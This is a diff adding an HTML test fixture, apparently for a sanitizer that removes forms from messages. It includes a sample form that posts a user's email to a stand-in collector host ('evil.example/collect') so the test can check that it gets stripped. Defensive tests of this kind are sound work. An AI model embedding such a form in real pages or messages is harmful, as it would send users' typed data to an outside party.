@@ -1,0 +1,17 @@
+<!-- Forms are no part of a message, and their controls could send what
+     the user typed: all of it goes. -->
+<html><body>
+<!-- drop: Subscribe -->
+<!-- drop: <input -->
+<!-- drop: <button -->
+<!-- drop: <select -->
+<!-- drop: <textarea -->
+<p>Before</p>
+<form action="https://evil.example/collect" method="post">
+  <input name="email" value="me@example.com">
+  <button>Subscribe</button>
+  <select><option>One</option></select>
+  <textarea>Body</textarea>
+</form>
+<p>After</p>
+</body></html>
